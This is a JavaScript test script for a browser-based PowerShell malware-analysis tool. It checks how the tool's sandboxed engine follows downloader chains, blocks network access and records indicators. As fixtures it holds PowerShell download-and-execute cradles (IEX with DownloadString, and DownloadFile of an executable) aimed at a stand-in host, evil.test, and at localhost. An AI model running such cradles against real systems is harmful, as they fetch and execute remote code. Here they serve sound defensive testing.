// Husk — PowerShell deobfuscation and IOC extraction, fully browser-local.
// SPDX-License-Identifier: PolyForm-Small-Business-1.0.0
// Required Notice: Copyright 2026 Mo4n6 (https://github.com/Mo4n6/tools)
//
// Husk stage-2 probe: does a downloader's chain actually get followed?
//
// A downloader is most of what an analyst pastes in, and for a long time Husk
// stopped exactly where it got interesting: DownloadString recorded the URL and
// returned $null, so `IEX $null` ran nothing. The engine now serves a body the
// analyst supplies, and the stage executes for real.
//
// Supplying it is not a shortcut around a missing fetch. A browser can only
// read a cross-origin response when the server sends CORS headers, and C2
// infrastructure does not, so an automatic fetch is refused by the browser
// before the engine sees it — which this probe also checks, against a server
// that sends them and one that does not.
//
// Run it against a published bundle (see rebuild.sh):
//
//   HUSK_BUNDLE=<…>/browser-wasm/AppBundle \
//   HUSK_CHROME=/opt/pw-browsers/chromium-*/chrome-linux/chrome \
//   node scripts/husk/wasm-spike/stage2-probe.mjs
//
// The playwright package is a devDependency, so `npm ci` installs it but not
// the browsers: `npx playwright install chromium`, or point HUSK_CHROME at one.
import { chromium } from "playwright";
import { createServer } from "node:http";
import { readFileSync, existsSync } from "node:fs";
import { join, extname } from "node:path";

const R =
  process.env.HUSK_BUNDLE ??
  `${process.env.HUSK_SPIKE ?? "."}/bin/Release/net8.0/browser-wasm/AppBundle`;
const T = {
  ".js": "text/javascript",
  ".json": "application/json",
  ".wasm": "application/wasm",
  ".dll": "application/octet-stream",
  ".dat": "application/octet-stream",
  ".symbols": "text/plain",
};

const engine = createServer((q, r) => {
  const p = decodeURIComponent(q.url.split("?")[0]);
  if (p === "/") {
    r.writeHead(200, { "Content-Type": "text/html" });
    return r.end(
      '<!doctype html><meta charset=utf-8><script type="module" src="./main.js"></script>',
    );
  }
  const f = join(R, p);
  if (!existsSync(f)) {
    r.writeHead(404);
    return r.end("no");
  }
  r.writeHead(200, { "Content-Type": T[extname(f)] ?? "application/octet-stream" });
  r.end(readFileSync(f));
});

// Two stand-ins for stage 2: one host that allows a cross-origin read, and one
// that behaves like every real server by saying nothing about CORS at all.
const permissive = createServer((q, r) =>
  r
    .writeHead(200, {
      "content-type": "text/plain",
      "access-control-allow-origin": "*",
    })
    .end("Write-Host 'LIVE-CORS-RAN'"),
);
const realistic = createServer((q, r) =>
  r.writeHead(200, { "content-type": "text/plain" }).end("Write-Host 'LIVE-NOCORS-RAN'"),
);

// Permissive about CORS and unsuccessful anyway, which is what an error page
// from a reachable host looks like.
const missing = createServer((q, r) =>
  r
    .writeHead(404, {
      "content-type": "text/html",
      "access-control-allow-origin": "*",
    })
    .end("<html>not found</html>Write-Host 'ERRORPAGE-RAN'"),
);

await new Promise((ok) => engine.listen(4229, () => ok(undefined)));
await new Promise((ok) => missing.listen(4233, () => ok(undefined)));
await new Promise((ok) => permissive.listen(4231, () => ok(undefined)));
await new Promise((ok) => realistic.listen(4232, () => ok(undefined)));

const browser = await chromium.launch({ executablePath: process.env.HUSK_CHROME });
const page = await browser.newPage();
await page.goto("http://localhost:4229/", { waitUntil: "domcontentloaded" });
await page.waitForFunction(() => typeof globalThis.hostCalls === "function", null, {
  timeout: 180000,
});
await page.evaluate(() => globalThis.psInit());

const results = [];
const check = (name, ok, detail) => {
  results.push({ name, ok });
  process.stdout.write(`${ok ? "PASS" : "FAIL"}  ${name}${ok ? "" : `\n        ${detail}`}\n`);
};

/**
 * One run, set up the way the worker sets one up.
 *
 * The baseline snapshot is not optional: without it DroppedFiles() has nothing
 * to diff against and hashes the whole virtual filesystem, which from the
 * outside is indistinguishable from a hang. Cost an hour of looking in the
 * wrong place.
 */
const run = (script, supplied = [], mode = "blocked") =>
  page.evaluate(
    ([s, sup, m]) => {
      globalThis.resetDownloads();
      globalThis.setNetworkMode(m);
      // All three ledgers, exactly as the worker drains them. The boundary one
      // is here because leaving it out is what let one sample's network
      // records turn up in the next sample's report.
      globalThis.proxyCalls();
      globalThis.drainBoundary();
      globalThis.snapshotFs();
      for (const [k, v] of sup) globalThis.supplyDownload(k, v);
      const r = globalThis.runFixture(s);
      const calls = globalThis.hostCalls();
      const dropped = globalThis.droppedFiles();
      globalThis.proxyCalls();
      return { r, calls, dropped };
    },
    [script, supplied, mode],
  );

const outcomes = (o) => o.calls.flatMap((c) => (c.args ?? []).map(String));
const CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/stage2.ps1')";
const STAGE2 = "Write-Host 'STAGE2-RAN'; Start-Process calc.exe";

// Nothing supplied: the URL is still the evidence the analyst came for, and
// nothing executes. This is the behaviour the engine shipped with.
let o = await run(CRADLE);
check("blocked: stage 2 does not run", !o.r.output.includes("STAGE2-RAN"), o.r.output);
check(
  "blocked: the url is still recorded",
  outcomes(o).some((a) => a.includes("evil.test")),
  JSON.stringify(outcomes(o)),
);
check(
  "blocked: the outcome says so",
  outcomes(o).includes("blocked"),
  JSON.stringify(outcomes(o)),
);

o = await run(CRADLE, [["http://evil.test/stage2.ps1", STAGE2]]);
check("exact url: stage 2 runs", o.r.output.includes("STAGE2-RAN"), `${o.r.output} | ${o.r.error}`);
check(
  "exact url: stage 2's own IOCs are captured",
  o.calls.some((c) => c.op === "process.start"),
  JSON.stringify(o.calls.map((c) => [c.source, c.op])),
);
check(
  "exact url: the stage is one layer, not two",
  (o.r.layers ?? []).filter((l) => l.includes("STAGE2-RAN")).length === 1,
  JSON.stringify(o.r.layers ?? []),
);

// Samples build URLs at runtime with a random host or a cache-buster, so the
// only part an analyst can key on in advance is the name - or nothing.
o = await run("IEX (New-Object Net.WebClient).DownloadString('http://o.test/a/stage2.ps1?r=93812')", [
  ["stage2.ps1", STAGE2],
]);
check("filename match: stage 2 runs", o.r.output.includes("STAGE2-RAN"), o.r.output);

o = await run("IEX (New-Object Net.WebClient).DownloadString('http://whatever.test/x')", [
  ["*", STAGE2],
]);
check("wildcard: stage 2 runs", o.r.output.includes("STAGE2-RAN"), o.r.output);

o = await run("IEX (Invoke-WebRequest 'http://evil.test/s.ps1').Content", [["s.ps1", STAGE2]]);
check(
  "iwr .Content: stage 2 runs",
  o.r.output.includes("STAGE2-RAN"),
  `${o.r.output} | ${o.r.error}`,
);

// The whole point of following a chain: stage 2 downloads stage 3.
o = await run(CRADLE, [
  ["stage2.ps1", "Write-Host 'S2'; IEX (New-Object Net.WebClient).DownloadString('http://evil.test/s3.ps1')"],
  ["s3.ps1", "Write-Host 'STAGE3-RAN'"],
]);
check("nested: stage 3 runs too", o.r.output.includes("STAGE3-RAN"), `${o.r.output} | ${o.r.error}`);

o = await run(
  "(New-Object Net.WebClient).DownloadFile('http://evil.test/p.exe','C:\\Users\\Public\\p.exe')",
  [["p.exe", "MZpayload-bytes"]],
);
check(
  "DownloadFile: the payload lands where the sample asked",
  o.dropped.some((d) => d.path.endsWith("/Users/Public/p.exe") && d.size > 0),
  JSON.stringify(o.dropped),
);

o = await run("(New-Object Net.WebClient).DownloadString('http://evil.test/stage2.ps1') | Out-Null", [
  ["stage2.ps1", "Write-Host 'hi'"],
]);
check(
  "DownloadString: the body is kept so it can be saved",
  o.dropped.some((d) => d.path.includes("husk-downloads") && d.size > 0),
  JSON.stringify(o.dropped),
);

// A chain is attacker-controlled, so it needs an end that is not the client's
// hard timeout - that kills the worker and loses the whole trace.
o = await run(
  '1..20 | ForEach-Object { (New-Object Net.WebClient).DownloadString("http://evil.test/$_.ps1") | Out-Null }',
  [["*", "Write-Host 'x'"]],
);
check(
  "cap: resolution stops at 16",
  outcomes(o).filter((a) => a.startsWith("supplied")).length === 16,
  `resolved ${outcomes(o).filter((a) => a.startsWith("supplied")).length}`,
);
check(
  "cap: the refusal is recorded rather than silent",
  outcomes(o).some((a) => a.includes("resolution cap")),
  JSON.stringify(outcomes(o).slice(-3)),
);

// The live path, exercised here and nowhere else.
//
// These run on the page's main thread, which tolerates a synchronous request.
// The engine in the product runs in a worker, where the same request kills the
// worker outright - found by an e2e check, reproduced with a control run, and
// the reason no live control is offered in the UI. So treat these two as
// covering the resolver's branching, not as evidence that live mode is usable.
//
// Live mode works where the server allows a cross-origin read...
o = await run("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4231/s.ps1')", [], "live");
check(
  "live, CORS-permissive host: the stage runs",
  o.r.output.includes("LIVE-CORS-RAN"),
  `${o.r.output} | ${o.r.error}`,
);

// ...and not where it does not, which is everywhere that matters. The refusal
// has to be legible, or an analyst reads an empty result as "the server was
// down" - a different and wrong conclusion.
o = await run("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4232/s.ps1')", [], "live");
check(
  "live, no CORS: the browser refuses it",
  !o.r.output.includes("LIVE-NOCORS-RAN"),
  o.r.output,
);
check(
  "live, no CORS: the boundary says why",
  o.calls.some((c) => c.source === "boundary" && (c.error ?? "").length > 0),
  JSON.stringify(o.calls.filter((c) => c.source === "boundary")),
);

// ---------------------------------------------------------------------------
// The four defects a code review found after the first version of this probe
// passed 17 checks. Every one of them lives in state that survives a run, or
// in live mode - and every case above runs once, in blocked mode. That was the
// hole, so these are cross-run and live on purpose.
// ---------------------------------------------------------------------------

// The sample's verb, not an assumed GET. Recording GET for a POST tells the
// analyst the wrong thing, and in live mode sends the wrong request.
o = await run("Invoke-WebRequest -Uri 'http://evil.test/p' -Method POST", [["p", "x"]]);
check(
  "method: a POST is recorded as POST",
  outcomes(o).includes("POST"),
  JSON.stringify(outcomes(o)),
);

// PowerShell maps WebRequestMethod.Default onto GET, so a sample using
// `-Method Default` must not be reported as a DEFAULT verb or send one.
o = await run("Invoke-WebRequest -Uri 'http://evil.test/d' -Method Default", [["d", "x"]]);
check(
  "method: Default is normalised to GET",
  outcomes(o).includes("GET") && !outcomes(o).includes("DEFAULT"),
  JSON.stringify(outcomes(o)),
);

// One sample's network records must not appear in the next one's report.
await run("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4231/s.ps1')", [], "live");
o = await run("Write-Host 'second sample'");
check(
  "boundary: the previous run's URLs are gone",
  !o.calls.some((c) => JSON.stringify(c).includes("4231")),
  JSON.stringify(o.calls),
);

// Reset clears what belongs to the sample. The network mode belongs to the
// session, and clearing it here left the JS boundary and this resolver
// disagreeing about whether the network was open.
o = await page.evaluate(() => {
  globalThis.setNetworkMode("live");
  globalThis.resetDownloads();
  globalThis.proxyCalls();
  globalThis.drainBoundary();
  globalThis.snapshotFs();
  const r = globalThis.runFixture(
    "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4231/s.ps1')",
  );
  const calls = globalThis.hostCalls();
  globalThis.proxyCalls();
  globalThis.drainBoundary();
  return { r, calls, dropped: [] };
});
check(
  "mode: resetting downloads does not close the network behind the host's back",
  o.r.output.includes("LIVE-CORS-RAN"),
  `${o.r.output} | ${o.r.error}`,
);

// An error page is not a stage, even from a host that allows the read.
o = await run("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4233/s.ps1')", [], "live");
check(
  "status: a 404 body is not executed as a stage",
  !o.r.output.includes("ERRORPAGE-RAN"),
  o.r.output,
);
check(
  "status: the 404 is recorded rather than swallowed",
  o.calls.some((c) => String(c.outcome ?? "").includes("404")) ||
    outcomes(o).some((a) => a.includes("no body")),
  JSON.stringify(o.calls.map((c) => [c.source, c.outcome, c.args])),
);

await browser.close();
engine.close();
missing.close();
permissive.close();
realistic.close();

const failed = results.filter((r) => !r.ok).length;
process.stdout.write(`\n${results.length - failed}/${results.length} checks passed\n`);
process.exit(failed ? 1 : 0);
